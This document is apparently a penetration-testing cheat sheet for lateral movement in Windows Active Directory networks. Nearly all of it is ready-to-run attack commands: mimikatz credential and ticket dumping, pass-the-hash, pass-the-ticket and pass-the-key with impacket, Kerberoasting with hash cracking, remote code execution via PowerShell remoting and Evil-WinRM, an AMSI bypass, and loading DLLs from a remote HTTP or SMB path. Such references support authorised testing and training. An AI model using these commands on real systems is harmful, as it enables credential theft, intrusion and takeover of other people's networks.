# Lateral Movement

## Pass the Hash

Use the hash to login in another machine as a local user without knowing its password. Works because NTLM hashes are static so if a user logs into different machines his hash will remain the same on each host.

```
pth-winexe -U <domain>/<user>%<NT hash>:<LM hash> //<target ip> cmd

#impacket
smbexec.py <user>@<ip> -hashes <NTLM>
psexec.py <user>@<ip> -hashes <NTLM>
wmiexec.py <user>@<ip> -hashes <NTLM>

#mimikatz
sekurlsa::logonpasswords    #get a list of NTLM and DAPI keys for users
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM> /run:powershell.exe
```

## Pass the Ticket

Loads a ticket in memory granting the current user access to the remote machine/service within the context of the current session.

```
sekurlsa::tickets /export
```

#### Run on Windows

```
kerberos::ptt <.krbi file>
.\PsExec.exe -accepteula \\<target host> cmd
```

#### Run on Linux

```
#convert and store the ticket file for impacket use
python ticket_converter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=<.ccache file path>

#start remote connection
python psexec.py <domain>/<user>@<host> -k -no-pass
python smbexec.py <domain>/<user>@<host> -k -no-pass
python wmiexec.py <domain>/<user>@<host> -k -no-pass
```

## Pass the Key

Obtain a TGT ticket by providing NTLM token, AES key or a  password. The obtained TGT token can then be used to access other machines.

```
python getTGT.py <domain_name>/<user_name> -hashes <NTLM>
python getTGT.py <domain_name>/<user_name> -aesKey <AES>
python getTGT.py <domain_name>/<user_name>:<password>

export KRB5CCNAME=<ccache file>

#start remote connection
python psexec.py <domain>/<user>@<host> -k -no-pass
python smbexec.py <domain>/<user>@<host> -k -no-pass
python wmiexec.py <domain>/<user>@<host> -k -no-pass
```

## Kerbertoast

Send a request to a TGT for a Kerberos token, dump it from memory, crack it locally to obtain access to the target. Vulnerable accounts need to have the flag `serverPrincipalName` set.

Enumerate remote targets

```
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl

get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
get-adobject -filter {serviceprincipalname -ne $null} -prop serviceprincipalname

setspn -T <domain> -Q */*
```

Enumerate  local sessions

```
klist
```

Request a Service Ticket from the target. The ticket will be stored in memory

```
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
```

Dump the SPN ticket using Mimikatz

```
privilege::debug
token::elevate
kerberos::list /export
```

Crack the .kirbi file

```
hashcat -m 13100 --force <hashfile> <wordlist>
john --format=krb5tgs --wordlist=<wordlist> <hashfile>    #requires jumbo version
```

## Powershell remoting

### Manage sessions

Enable remoting (Administrative privileges required)

```
 Enable-PSRemoting
```

connect to machine

```
Enter-PSSession -ComputerName <fqdn>
```

Store session data and connect

```
$<varname>= New-PSSession -ComputerName <fqdn>
Enter-PSSession -Sessions <varname>
```

### Code execution

Invoke-Command

```
//disable limit on laguage, enable scriptlets
Invoke-Command -ComputerName <fqdn> -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}

Invoke-Command -ComputerName <fqdn> -ScriptBlock {<code>} 
Invoke-Command -ComputerName <fqdn> -FilePath <path>    //script from file
```

#### Code execution with valid credentials

Load credentials

```
$session = New-PSSession -ComputerName <fqdn>
$secPassword = ConvertTo-SecureString '<pass>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb.local\<username>', $secPassword)
```

Execute command

```
Invoke-Command -ComputerName <fqdn> -Credential $cred -ScriptBlock {<commands>}
```

Run a PowerShell script remotely

```
Invoke-Command -Credential $cred -ComputerName <fqdn> -FilePath <path to ps1 file> -Session $session
```

## RDP

Mimikatz

```
privilege::debug
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash> /run:"mstsc.exe /restrictedadmin"
```

Xfreerdp

```
xfreerdp +clipboard /dynamic-resolution /cert-ignore /u:<user> /pth:<ntlm hash> /v:<host>
```

## RunAs

```
cmdkey /list                                      //get a list of credentials, runas will use the ones in memory
runas /savecred /user:<user> "\\<ip>\<path>"      //connect to share
runas /savecred /user:<user> "cmd.exe /k <cmd>"   //run command as user

runas /env /noprofile /user:<username> <password> "<cmd>"
```

## Evil-WinRM

Ps1 files must be stored in path specified by -s option. To execute a script simply type its name in the console.

```
evil-winrm -i <ip> -u Administrator -p <password>
evil-winrm -i <ip> -u Administrator -H <hash>
```

### In-memory execution + AMSI Bypass

Find pre-compiled binaries for in-memory execution here: [https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)

```
menu
Bypass-4MSI
Invoke-Binary <path to local compiled file>
```

### Dll loader

```
Dll-loader -http -path http://<path to .dll>
Dll-loader -smb -path \\<share>\\<file>.dll
Dll-loader -local -path C:\<path to dll>
```
